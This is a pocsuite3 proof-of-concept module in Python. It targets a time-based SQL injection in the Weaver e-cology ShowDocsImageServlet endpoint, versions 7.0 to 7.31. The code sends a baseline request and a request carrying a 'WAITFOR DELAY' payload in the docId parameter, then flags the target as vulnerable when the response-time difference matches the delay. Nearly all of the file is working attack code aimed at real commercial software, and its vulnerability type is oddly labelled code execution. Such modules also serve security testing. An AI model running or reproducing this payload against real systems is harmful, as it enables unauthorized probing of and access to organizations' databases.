from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '泛微 e-cology weaver.docs.docs.ShowDocsImageServlet 存在SQL注入漏洞'
    appName = '泛微 e-cology'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''上海泛微网络科技股份有限公司e-cology weaver.docs.docs.ShowDocsImageServlet 存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        base_path = "/weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1"
        inject_path = "/weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1+WAITFOR+DELAY+'0%3a0%3a5'"
        base_url = self.url+base_path
        inject_url = self.url+inject_path
        base_resp = requests.get(url=base_url, headers=headers, verify=False, allow_redirects=False, timeout=15)
        inject_resp = requests.get(url=inject_url, headers=headers, verify=False, allow_redirects=False, timeout=15)
        base_time = base_resp.elapsed.total_seconds()
        inject_time = inject_resp.elapsed.total_seconds()
        if ((inject_time - base_time) >= 4.5 and (inject_time - base_time) <= 5.5 or (inject_time - base_time) >= 9.5 and (inject_time - base_time) <= 10.5) and base_resp.status_code == 200 and inject_resp.status_code == 200 and 'image' in inject_resp.headers.get('Content-Type'):  
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = inject_url
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
